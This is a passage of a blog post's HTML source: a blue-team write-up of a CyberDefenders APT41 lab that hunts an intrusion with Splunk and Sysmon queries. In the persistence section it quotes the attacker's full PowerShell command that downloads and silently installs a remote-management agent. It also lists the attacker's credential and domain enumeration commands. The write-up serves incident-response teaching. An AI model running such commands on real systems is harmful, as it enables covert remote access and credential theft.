@@ -1,0 +1,1377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Mustafa Al-Zaareer">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://mustafaalzaareer.github.io/2026/01/27/cyberdeefnders-starktech-incident-apt41-lab/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Cybersecurity researcher, CTF player, forensics &amp; malware analysis">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CyberDeefnders: StarkTech Incident - APT41 Lab">
+<meta property="og:url" content="https://mustafaalzaareer.github.io/2026/01/27/CyberDeefnders-StarkTech-Incident-APT41-Lab/index.html">
+<meta property="og:site_name" content="Mustafa Alzaareer&#39;s Blog">
+<meta property="og:description" content="Cybersecurity researcher, CTF player, forensics &amp; malware analysis">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://mustafaalzaareer.github.io/images/hacker.svg">
+<meta property="article:published_time" content="2026-01-27T06:15:15.000Z">
+<meta property="article:modified_time" content="2026-01-27T12:24:36.320Z">
+<meta property="article:author" content="Mustafa Alzaareer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mustafaalzaareer.github.io/images/hacker.svg">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/hacker.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/hacker.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/hacker.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            CyberDeefnders: StarkTech Incident - APT41 Lab | Mustafa Al-zaareer&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"mustafaalzaareer.github.io","root":"/","language":"en","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/hacker.svg","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/hacker.svg","description":null},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wall3.jpg","dark":"/images/wall3.jpg"},"title":"Mustafa Al-zaareer's Blog","subtitle":{"text":["I'm Mustafa Al-Zaareer","Cyber Security Student"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":"https://github.com/mustafaalzaareer","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"CATEGORIES":{"path":"/categories","icon":"fa-regular fa-folder"},"ARCHIVE":{"path":"/archive","icon":"fa-regular fa-archive"},"About":{"path":"/about","icon":"fa-regular fa-user"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Mustafa Al-zaareer&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archive"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVE
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archive"
+                        >
+                            <span>
+                                ARCHIVE
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/categories"
+                        >
+                            <span>Categories</span>
+                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">CyberDeefnders: StarkTech Incident - APT41 Lab</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/hacker.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Mustafa Al-Zaareer</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-01-27 09:15:15</span>
+        <span class="mobile">2026-01-27 09:15:15</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-01-27 15:24:36</span>
+            <span class="mobile">2026-01-27 15:24:36</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Cyberdefenders/">Cyberdefenders</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Cyberdefenders/Threat-Hunting/">Threat Hunting</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Hi, I’m Mustafa, also known as 0xMustafa. I have a strong passion for Blue Team operations and threat hunting, focusing on detecting, analyzing, and mitigating security incidents in real-world scenarios. Over the past year, I’ve been actively solving labs on CyberDefenders, and previously I achieved Top 1 globally on the platform.</p>
+<p>This writeup marks the beginning of my journey to share insights, techniques, and methodologies I use while solving CyberDefenders labs. My goal is to help fellow security enthusiasts understand practical approaches in detection, analysis, and mitigation while keeping the content professional, clear, and actionable.</p>
+<p>Let’s dive in and have some fun while learning!</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/scoarboard.jpg"
+                      title="scoreboard"
+                ></p>
+<h1 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h1><p>On August 25, 2025, CoreTech’s SOC spotted unusual activity on a workstation, hinting at a breach. Suspicious processes and network activity spread to critical servers, threatening data and systems.</p>
+<h1 id="My-Analysis"><a href="#My-Analysis" class="headerlink" title="My Analysis"></a>My Analysis</h1><p>I will start analyzing the incident, detect the attack activity and after this I will move to the Questions to answer them, but first we need to analyze the incident without reading the questions to improve our skills in detection. </p>
+<h2 id="Intial-access-and-Execution"><a href="#Intial-access-and-Execution" class="headerlink" title="Intial access and Execution"></a>Intial access and Execution</h2><p>in the first we need to detect how the attacker access the system and what is the activities he took to explore the system, we have a triage images of <code>DESKTOP, File-Server and DC01(Domain Controller)</code> and we have access to SIEM Solution <code>Splunk</code>, I will start by exploring the Log Sources that I have in the SIEM Solution. </p>
+<p>Query:<br><code>| metadata type=sources</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/metadata.png"
+                     
+                > </p>
+<p>We have windows event logs and the most important source for us is Sysmon, because it contain a lot of useful information about Processes activity, registry activity, files activity and so on</p>
+<p><code>System Monitor (Sysmon) is a Windows system service and device driver that, once installed on a system, remains resident across system reboots to monitor and log system activity to the Windows event log. It provides detailed information about process creations, network connections, and changes to file creation time.</code> </p>
+<p>Now I want to see what is the Event IDs that we have in sysmon. </p>
+<p>Query:<br><code>index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational | stats count by EventCode</code> </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/eventcodes.png"
+                     
+                ></p>
+<p>Let’s summarize the most important event IDs </p>
+<table>
+<thead>
+<tr>
+<th>Event ID</th>
+<th align="center">Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td align="center">proccess Creation</td>
+</tr>
+<tr>
+<td>3</td>
+<td align="center">Network connection</td>
+</tr>
+<tr>
+<td>7</td>
+<td align="center">Image loaded</td>
+</tr>
+<tr>
+<td>8</td>
+<td align="center">CreateRemoteThread</td>
+</tr>
+<tr>
+<td>10</td>
+<td align="center">ProcessAccess</td>
+</tr>
+<tr>
+<td>11</td>
+<td align="center">FileCreate</td>
+</tr>
+<tr>
+<td>12</td>
+<td align="center">RegistryEvent (Object create and delete)</td>
+</tr>
+<tr>
+<td>13</td>
+<td align="center">RegistryEvent (Value Set)</td>
+</tr>
+<tr>
+<td>15</td>
+<td align="center">FileCreateStreamHash</td>
+</tr>
+<tr>
+<td>17</td>
+<td align="center">PipeEvent (Pipe Created)</td>
+</tr>
+<tr>
+<td>18</td>
+<td align="center">PipeEvent (Pipe Connected)</td>
+</tr>
+<tr>
+<td>22</td>
+<td align="center">DNSEvent (DNS query)</td>
+</tr>
+</tbody></table>
+<p>We Know that the Incident was in 25&#x2F;8&#x2F;2025 so we will focus in the events in this day, I always like to start by exploring the files that have been downloaded from the internet.</p>
+<p>Query:<br><code>index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=15 | table _time host file_path | sort _time</code></p>
+<p>Explanation of the query:<br><code>index=*</code><br>This tells Splunk to search all indexes.</p>
+<p><code>source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational</code><br>This filters events coming only from the Sysmon Operational log.</p>
+<p><code>EventCode=15</code><br>Sysmon EventCode 15 means “File Created” or “File Stream Created” depending on the Sysmon version.</p>
+<p><code>| table _time host file_path</code><br>table selects only specific fields from the results.<br>Here:<br><code>_time</code> → timestamp of the event<br><code>host</code> → the machine where the event happened<br><code>file_path</code> → the path of the created file</p>
+<p><code>| sort _time</code><br>Sorts the results by timestamp in ascending order.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/event15.png"
+                     
+                ></p>
+<p>No files were created on that day.<br>Lets move to see the websites accessed by the users on that day, I will use <code>earliest</code> option to tell splunk that i want to events that created in the starting of day 25 and later</p>
+<p><code>1756080000</code> convert it to UNIX timestamp -&gt; &#96;</p>
+<p>Query:<br><code>index=* EventCode=22 earliest=1756080000 | table QueryName,  _time | sort _time</code> </p>
+<p>scrolling the result we can see that <code>paste.sh</code> accessed on <code>2025-08-25 13:27:40</code><br><code>paste.sh</code> allows you to paste text, code, or logs and share it via a link, so we need to check it, now i want to find the user that accessed this site, just click on the event and select view event.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/paste.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/paste2.png"
+                     
+                > </p>
+<p>the user who made the query was <code>t.leao</code> so I will back to the triage images and go to the browser history for this user.<br><code>DESKTOP\uploads\auto\C%3A\Users\t.leon\AppData\Local\Microsoft\Edge\User Data\Default</code><br>opening the history file using DB broswer.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/history.png"
+                     
+                > </p>
+<p>ok now we have the link that accessed by the user, lets visit it, and se what is inside it. </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/paste3.png"
+                     
+                > </p>
+<p>wow, this command used powershell to download exe file and store it in the temp, lest complete our analysis and confirm that this was the intial access of the attacker </p>
+<p>Query:<br><code>index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational Image=*iexploreplugin.exe | stats count by EventCode</code> </p>
+<p>this query will help as to see what is the activities of this process.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/iexploer.png"
+                     
+                ></p>
+<p>we have activites related to process creation, file creation, network connection, image loading, registry set values. </p>
+<p>after running the executable, it made network connection to two IPs, <code>10.10.5.62</code> and <code>10.10.11.74</code> with ports <code>8080, 49668, 135</code><br>the most intersting thing that there is 1768 connections made from the executable to <code>10.10.5.62:8080</code>,it seems to be C2. </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/c21.png"
+                     
+                ></p>
+<p>now I want to see if this proccess spawned another processes or executed some suspicious commands. </p>
+<p>Query:<br><code>index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 ParentImage=*iexploreplugin.exe | table _time Image CommandLine ParentImage ParentCommandLine SHA256 |sort _time</code> </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/recon.png"
+                     
+                ></p>
+<p>wow, We have captured the attacker.</p>
+<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>The attack started on <code>2025-08-25 at 13:27:40</code> when the user <code>t.leao</code> interacted with a malicious script hosted on <code>paste.sh</code>. This triggered the download of <code>iexploreplugin.exe</code>, which served as the malware providing the attacker with initial access.</p>
+<p>Once executed, the malware connected to the attacker’s C2 server at <code>10.10.5.62:8080</code> and ran a series of discovery commands to map the environment.</p>
+<h2 id="Discovery"><a href="#Discovery" class="headerlink" title="Discovery"></a>Discovery</h2><p>In the previous section, we observed that after establishing C2 communication, the attacker executed several discovery commands to gain a better understanding of the compromised environment. This phase is critical, as it allows the attacker to enumerate system, user, and network information before moving to the next stage of the attack.</p>
+<p>Below is a breakdown of the observed discovery activity and its purpose:</p>
+<ol>
+<li><code>cmdkey /list</code></li>
+</ol>
+<p>Binary: C:\Windows\System32\cmdkey.exe<br>Purpose:<br>Lists all stored credentials in the Windows Credential Manager.</p>
+<p>Why attackers use it:<br>Identify cached credentials (RDP, SMB, scheduled tasks, services)<br>Target credentials that can be reused for lateral movement</p>
+<ol start="2">
+<li><code>net view \\coretech.lab\SYSVOL</code></li>
+</ol>
+<p>Binary: C:\Windows\System32\net.exe<br>Purpose:<br>Enumerates the SYSVOL share of the domain controller.</p>
+<p>Why attackers use it:<br>Identify domain structure<br>Locate Group Policy Objects (GPOs)<br>Search for scripts containing hardcoded credentials</p>
+<ol start="3">
+<li><code>net user /domain</code></li>
+</ol>
+<p>Purpose:<br>Lists all domain user accounts.</p>
+<p>Why attackers use it:<br>Identify high‑value accounts<br>Map the domain’s user landscape</p>
+<ol start="4">
+<li><code>net user</code></li>
+</ol>
+<p>Purpose:<br>Enumerates local user accounts on the compromised system.</p>
+<p>Why attackers use it:<br>Identify local admins or service accounts</p>
+<ol start="5">
+<li><code>net localgroup administrators</code></li>
+</ol>
+<p>Purpose:<br>Lists all members of the local Administrators group.</p>
+<p>Why attackers use it:<br>Check if the compromised user already has administrative privileges<br>Identify accounts worth targeting for escalation</p>
+<ol start="6">
+<li><code>whoami</code></li>
+</ol>
+<p>Binary: C:\Windows\System32\whoami.exe<br>Purpose:<br>Displays the current user context.</p>
+<p>Why attackers use it:<br>Confirm which account is compromised</p>
+<ol start="7">
+<li><code>ping -n 1 DC01</code></li>
+</ol>
+<p>Binary: C:\Windows\System32\PING.EXE<br>Purpose:<br>Checks connectivity to the domain controller (DC01).</p>
+<p>Why attackers use it:<br>Verify domain reachability<br>Confirm internal network access<br>Test if lateral movement is possible.</p>
+<ol start="8">
+<li><code>net group &quot;Domain Admins&quot; /domain</code></li>
+</ol>
+<p>Purpose:<br>Enumerates all members of the Domain Admins group.</p>
+<p>Why attackers use it:<br>Identify top-tier privileged accounts</p>
+<ol start="9">
+<li><code>whoami /all</code></li>
+</ol>
+<p>Purpose:<br>Displays: User SID, Group memberships, Assigned privileges and tokens</p>
+<p>Why attackers use it:<br>Check for powerful privileges (e.g., SeDebugPrivilege)<br>Identify misconfigurations</p>
+<ol start="10">
+<li><code>tasklist</code></li>
+</ol>
+<p>Binary: C:\Windows\System32\tasklist.exe<br>Purpose:<br>Lists all running processes.</p>
+<p>Why attackers use it:<br>Identify security tools (AV, EDR, logging agents)<br>Spot high‑value processes (LSASS, browsers)</p>
+<h3 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h3><p>The attacker executed a series of built‑in Windows discovery commands to enumerate credentials, user privileges, domain information, and running processes after gaining initial access.</p>
+<h2 id="Persistance"><a href="#Persistance" class="headerlink" title="Persistance"></a>Persistance</h2><p>The attacker downloaded and setup multiple Remote Management Tools(RMM) on the compromised system between <code>2025-08-25 13:45:35</code> and <code>2025-08-25 14:00:00</code>. </p>
+<p>Query:<br><code>index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 earliest=1756128800 AND NOT chocolatey| table _time Image CommandLine ParentImage ParentCommandLine host |sort _time</code> </p>
+<p>This query will help us to find what commands and processes executed by the attacker after the intial discovery. </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/persis1.png"
+                     
+                ></p>
+<p>Ad to see the Services Installed we need to use Security Event ID <code>4697</code>.</p>
+<p>Query:<br><code>index=* EventCode=4697 earliest=1756128800 | table _time, host, service_name | sort _time</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/rmm.png"
+                     
+                ></p>
+<ol>
+<li>First RMM(AteraAgent)<br>A legitimate RMM agent used for remote monitoring, system management, and script execution on endpoints. Attackers often abuse it for persistent remote access while blending in with normal IT activity.</li>
+</ol>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -Command &quot;Invoke-WebRequest -Uri &#x27;https://HelpdeskSupport1755068837448.servicedesk.atera.com/GetAgent/Msi/?customerId=1&amp;amp;integratorLogin=bunionsneaker.4m%%40gmail.com&amp;amp;accountId=001Q300000VzBKuIAN&#x27; -OutFile C:\Windows\Temp\setup.msi; Start-Process msiexec -ArgumentList &#x27;/i C:\Windows\Temp\setup.msi /qn IntegratorLogin=bunionsneaker.4m@gmail.com CompanyId=1 AccountId=001Q300000VzBKuIAN&#x27; -Wait&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>this command will download msi file (AteraAgent Installer) and save it as <code>setup.msi</code>, then execute it using <code>msiexec.exe</code> to download AteraAgent Tool with login email <code>bunionsneaker.4m@gmail.com</code> and accountId <code>001Q300000VzBKuIAN</code></p>
+<ol start="2">
+<li><p>Second RMM(SplashtopRemoteService)<br>Provides remote desktop access for IT support and administration. When misused, it allows attackers to maintain stealthy interactive access without deploying custom malware.</p>
+</li>
+<li><p>Third RMM(AnyDesk)<br>A popular remote access tool that enables full remote control of a system. Threat actors frequently leverage it to gain hands‑on access while bypassing traditional security detections.</p>
+</li>
+</ol>
+<p>After that, while searching through the created files, I found that two files were created under this path <code>C:\Windows\System32\Tasks\</code> , which means they are scheduled tasks. </p>
+<p>scheduled tasks names: <code>AteraAgentServiceWatchdog</code> and <code>Monitoring Recovery</code>, Since these task files are present in the triage image, their configurations can be examined to extract the executed commands and understand how persistence was maintained.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/monitoring.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
